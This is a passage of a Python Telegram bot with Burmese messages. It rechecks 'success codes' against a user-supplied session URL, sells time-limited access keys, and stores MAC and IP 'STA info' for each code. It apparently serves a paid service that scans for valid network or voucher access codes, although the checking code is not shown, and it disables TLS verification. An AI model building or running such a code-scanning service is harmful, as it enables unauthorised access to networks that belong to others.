    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
    new_success = []
    for entry in success:
        code = entry.split(" | ")[0].strip()
        recode = await perform_check(user_data[chat_id]['session_url'], code, chat_id, recheck=True, message=message)
        if recode:
            new_success.append(entry)
    if new_success:
        success_texts[chat_id] = new_success
        code_lines = []
        for e in new_success:
            parts = e.split(" | ", 1)
            if len(parts) == 2:
                code_lines.append(f"<code>{parts[0]}</code> | {parts[1]}")
            else:
                code_lines.append(f"<code>{e}</code>")
        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n" + "\n".join(code_lines), parse_mode="HTML")
    else:
        success_texts[chat_id] = []
        await bot.reply_to(message, "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")

@bot.message_handler(commands=['result'])
async def result_cmd(message):
    auth_list, _ = await get_file_content("auth_list.json")
    if str(message.chat.id) not in auth_list:
        await bot.reply_to(message, "သင်၏ key ကို register မလုပ်ရသေးပါ။")
        return
    results, _ = await get_file_content("result.json")
    cid = str(message.chat.id)
    if cid in results and results[cid]:
        codes = "\n".join(results[cid])
        await bot.reply_to(message, f"✅ GitHub မှ ရလဒ်များ:\n<code>{codes}</code>", parse_mode="HTML")
    else:
        await bot.reply_to(message, "သင့်တွင် GitHub တွင် code မရှိသေးပါ။")

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
    approved = sum(1 for v in approve.values() if v)
    uptime = int(time.monotonic() - _start_time)
    h, rem = divmod(uptime, 3600)
    m, s = divmod(rem, 60)
    await bot.reply_to(message, f"📊 Bot Status\n\n⏱ Uptime: {h}h {m}m {s}s\n🔍 Active Scans: {active}\n✅ Approved Users: {approved}\n👥 Sessions: {len(user_data)}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage: /genkey <duration> <user_id>\nDuration e.g. 30m, 1h, 2d, 1h30m, unlimited")
        return
    plan = args[1]
    uid = args[2]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "Duration ပုံစံမမှန်ပါ။")
        return
    auth_list, sha = await get_file_content("auth_list.json")
    auth_list[uid] = {"expires_at": expiry, "plan": plan}
    await update_file_content("auth_list.json", auth_list, sha, f"Add key {uid}")
    await bot.reply_to(message, f"✅ Key Generated\n\nUSER ID: {uid}\nPLAN: {plan}\nEXPIRES: {expiry}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /delkey <user_id>")
        return
    uid = args[1]
    auth_list, sha = await get_file_content("auth_list.json")
    if uid not in auth_list:
        await bot.reply_to(message, f"User ID {uid} မတွေ့ပါ။")
        return
    del auth_list[uid]
    await update_file_content("auth_list.json", auth_list, sha, f"Delete key {uid}")
    approve.pop(int(uid), None)
    user_data.pop(int(uid), None)
    await bot.reply_to(message, f"✅ Key Deleted\nUSER ID: {uid}")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    auth_list, _ = await get_file_content("auth_list.json")
    if not auth_list:
        await bot.reply_to(message, "Registered key မရှိသေးပါ။")
        return
    lines = []
    for uid, data in auth_list.items():
        if isinstance(data, dict):
            expires = data.get("expires_at", "unknown")
            plan = data.get("plan", "unknown")
            if expires == "9999-12-31T23:59:59Z":
                exp_str = "Unlimited"
            else:
                try:
                    exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                    now = datetime.now(timezone.utc)
                    if exp_dt < now:
                        exp_str = "Expired"
                    else:
                        diff = exp_dt - now
                        days = diff.days
                        hours, rem = divmod(diff.seconds, 3600)
                        minutes = rem // 60
                        exp_str = f"{days}d {hours}h {minutes}m left"
                except:
                    exp_str = expires
        else:
            plan, exp_str = "old", str(data)
        lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {exp_str}")
    text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            await bot.send_message(message.chat.id, text[i:i+4096])
    else:
        await bot.reply_to(message, text)

@bot.message_handler(commands=['stalist'])
async def stalist(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    sta_data, _ = await get_file_content("sta_info.json")
    if not sta_data:
        await bot.reply_to(message, "STA info မရှိသေးပါ။")
        return
    if len(args) >= 2:
        code = args[1]
        if code in sta_data:
            info = sta_data[code]
            mac = info.get('mac', 'Unknown')
            ip = info.get('ip', 'Unknown')
            ts = info.get('timestamp', 'Unknown')
            reply = f"📋 STA Info for {code}\n├ MAC: {mac}\n├ IP : {ip}\n└ Timestamp: {ts}"
            await bot.reply_to(message, reply)
        else:
            await bot.reply_to(message, f"Code {code} အတွက် STA info မရှိပါ။")
    else:
        lines = [f"📋 Stored STA Codes ({len(sta_data)})"]
        for code, info in sta_data.items():
            mac = info.get('mac', 'Unknown')
            ip = info.get('ip', 'Unknown')
            lines.append(f"{code} (MAC: {mac}, IP: {ip})")
        text = "\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)

@bot.message_handler(commands=['delsta'])
async def delsta(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /delsta <code>")
        return
    code = args[1]
    sta_data, sha = await get_file_content("sta_info.json")
    if code not in sta_data:
        await bot.reply_to(message, f"Code {code} အတွက် STA info မရှိပါ။")
        return
    del sta_data[code]
    await update_file_content("sta_info.json", sta_data, sha, f"Delete STA info for {code}")
    await bot.reply_to(message, f"✅ STA info for {code} deleted.")

# ==================== POLLING & MAIN ====================
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except Exception as e:
            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=2000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(success_github_updater())
        asyncio.create_task(sta_github_updater())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())